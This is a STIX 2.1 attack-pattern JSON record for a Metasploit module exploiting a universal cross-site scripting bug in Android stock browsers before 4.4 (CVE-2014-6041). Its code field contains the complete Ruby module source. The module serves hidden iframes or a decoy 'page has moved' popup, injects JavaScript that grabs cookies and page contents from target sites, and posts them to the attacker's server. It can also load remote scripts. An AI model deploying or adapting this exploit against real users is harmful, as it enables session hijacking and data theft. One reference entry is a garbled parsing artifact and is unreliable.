{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89c410ca-796e-4976-b01c-92df0d8cbe37",
    "created": "2024-08-14T16:32:33.301692Z",
    "modified": "2024-08-14T16:32:33.301696Z",
    "name": "Android Open Source Platform (AOSP) Browser UXSS",
    "description": " This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in all versions of Android's open source stock browser before 4.4, and Android apps running on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug to scrape both cookie data and page contents from a vulnerable browser window. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/android_stock_browser_uxss.rb",
            "external_id": "android_stock_browser_uxss.rb"
        },
        {
            "source_name": "reference",
            "url": "http://1337day.com/exploit/description/22581"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6041"
        },
        {
            "source_name": "OptString.new(TARGET_URLS",
            "external_id": ""
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Android Open Source Platform (AOSP) Browser UXSS',\n      'Description'    => %q{\n        This module exploits a Universal Cross-Site Scripting (UXSS) vulnerability present in\n        all versions of Android's open source stock browser before 4.4, and Android apps running\n        on < 4.4 that embed the WebView component. If successful, an attacker can leverage this bug\n        to scrape both cookie data and page contents from a vulnerable browser window.\n\n        If your target URLs use X-Frame-Options, you can enable the \"BYPASS_XFO\" option,\n        which will cause a popup window to be used. This requires a click from the user\n        and is much less stealthy, but is generally harmless-looking.\n\n        By supplying a CUSTOM_JS parameter and ensuring CLOSE_POPUP is set to false, this\n        module also allows running aribtrary javascript in the context of the targeted URL.\n        Some sample UXSS scripts are provided in data/exploits/uxss.\n      },\n      'Author'         => [\n        'Rafay Baloch', # Original discovery, disclosure\n        'joev'          # Metasploit module\n      ],\n      'License'        => MSF_LICENSE,\n      'Actions'        => [\n        [ 'WebServer' ]\n      ],\n      'PassiveActions' => [\n        'WebServer'\n      ],\n      'References' => [\n        [ 'URL', 'http://1337day.com/exploit/description/22581' ],\n        [ 'OSVDB', '110664' ],\n        [ 'CVE', '2014-6041' ]\n      ],\n      'DefaultAction'  => 'WebServer'\n    ))\n\n    register_options([\n      OptString.new('TARGET_URLS', [\n        true,\n        \"The comma-separated list of URLs to steal.\",\n        'http://example.com'\n      ]),\n      OptString.new('CUSTOM_JS', [\n        false,\n        \"A string of javascript to execute in the context of the target URLs.\",\n        ''\n      ]),\n      OptString.new('REMOTE_JS', [\n        false,\n        \"A URL to inject into a script tag in the context of the target URLs.\",\n        ''\n      ]),\n      OptBool.new('BYPASS_XFO', [\n        false,\n        \"Bypass URLs that have X-Frame-Options by using a one-click popup exploit.\",\n        false\n      ]),\n      OptBool.new('CLOSE_POPUP', [\n        false,\n        \"When BYPASS_XFO is enabled, this closes the popup window after exfiltration.\",\n        true\n      ])\n    ])\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"Request '#{request.method} #{request.uri}'\")\n\n    if request.method.downcase == 'post'\n      collect_data(request)\n      send_response_html(cli, '')\n    else\n      payload_fn = Rex::Text.rand_text_alphanumeric(4+rand(8))\n      domains = datastore['TARGET_URLS'].split(',')\n\n      html = <<-EOS\n  <html>\n    <body>\n      <script>\n        var targets = JSON.parse(atob(\"#{Rex::Text.encode_base64(JSON.generate(domains))}\"));\n        var bypassXFO = #{datastore['BYPASS_XFO']};\n        var received = [];\n\n        window.addEventListener('message', function(e) {\n          var data = JSON.parse(e.data);\n          if (!data.send) {\n            if (bypassXFO && data.i && received[data.i]) return;\n            if (bypassXFO && e.data) received.push(true);\n          }\n          var x = new XMLHttpRequest;\n          x.open('POST', window.location, true);\n          x.send(e.data);\n        }, false);\n\n        function randomString() {\n          var str = '';\n          for (var i = 0; i < 5+Math.random()*15; i++) {\n            str += String.fromCharCode('A'.charCodeAt(0) + parseInt(Math.random()*26))\n          }\n          return str;\n        }\n\n        function installFrame(target) {\n          var f = document.createElement('iframe');\n          var n = randomString();\n          f.setAttribute('name', n);\n          f.setAttribute('src', target);\n          f.setAttribute('style', 'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px');\n          f.onload = function(){\n            attack(target, n);\n          };\n          document.body.appendChild(f);\n        }\n\n        function attack(target, n, i, cachedN) {\n          var exploit = function(){\n            window.open('\\\\u0000javascript:if(document&&document.body){(opener||top).postMessage('+\n              'JSON.stringify({cookie:document.cookie,url:location.href,body:document.body.innerH'+\n              'TML,i:'+(i||0)+'}),\"*\");eval(atob(\"#{Rex::Text.encode_base64(custom_js)}\"'+\n              '));}void(0);', n);\n          }\n          if (!n) {\n            n = cachedN || randomString();\n            var closePopup = #{datastore['CLOSE_POPUP']};\n            var w = window.open(target, n);\n            var deadman = setTimeout(function(){\n              clearInterval(clear);\n              clearInterval(clear2);\n              attack(targets[i], null, i, n);\n            }, 10000);\n            var clear = setInterval(function(){\n              if (received[i]) {\n                if (i < targets.length-1) {\n                  try{ w.stop(); }catch(e){}\n                  try{ w.location='data:text/html,<p>Loading...</p>'; }catch(e){}\n                }\n\n                clearInterval(clear);\n                clearInterval(clear2);\n                clearTimeout(deadman);\n\n                if (i < targets.length-1) {\n                  setTimeout(function(){ attack(targets[i+1], null, i+1, n); },100);\n                } else {\n                  if (closePopup) w.close();\n                }\n              }\n            }, 50);\n            var clear2 = setInterval(function(){\n              try {\n                if (w.location.toString()) return;\n                if (w.document) return;\n              } catch(e) {}\n              clearInterval(clear2);\n              clear2 = setInterval(exploit, 50);\n            },20);\n          } else {\n            exploit();\n          }\n        }\n\n        var clickedOnce = false;\n        function onclickHandler() {\n          if (clickedOnce) return false;\n          clickedOnce = true;\n          attack(targets[0], null, 0);\n          return false;\n        }\n\n        window.onload = function(){\n          if (bypassXFO) {\n            document.querySelector('#click').style.display='block';\n            window.onclick = onclickHandler;\n          } else {\n            for (var i = 0; i < targets.length; i++) {\n              installFrame(targets[i]);\n            }\n          }\n        }\n      </script>\n      <div style='text-align:center;margin:20px 0;font-size:22px;display:none'\n           id='click' onclick='onclickHandler()'>\n        The page has moved. <a href='#'>Click here to be redirected.</a>\n      </div>\n    </body>\n  </html>\n      EOS\n\n      print_status(\"Sending initial HTML ...\")\n      send_response_html(cli, html)\n    end\n  end\n\n  def collect_data(request)\n    response = JSON.parse(request.body)\n    url = response['url']\n    if response && url\n      file = store_loot(\"android.client\", \"text/plain\", cli.peerhost, request.body, \"aosp_uxss_#{url}\", \"Data pilfered from uxss\")\n      print_good \"Collected data from URL: #{url}\"\n      print_good \"Saved to: #{file}\"\n    end\n  end\n\n  def backend_url\n    proto = (datastore[\"SSL\"] ? \"https\" : \"http\")\n    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']\n    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : \":#{datastore['SRVPORT']}\"\n    \"#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch\"\n  end\n\n  def custom_js\n    rjs_hook + datastore['CUSTOM_JS']\n  end\n\n  def rjs_hook\n    remote_js = datastore['REMOTE_JS']\n    if remote_js.present?\n      \"var s = document.createElement('script');s.setAttribute('src', '#{remote_js}');document.body.appendChild(s); \"\n    else\n      ''\n    end\n  end\n\n  def run\n    exploit\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}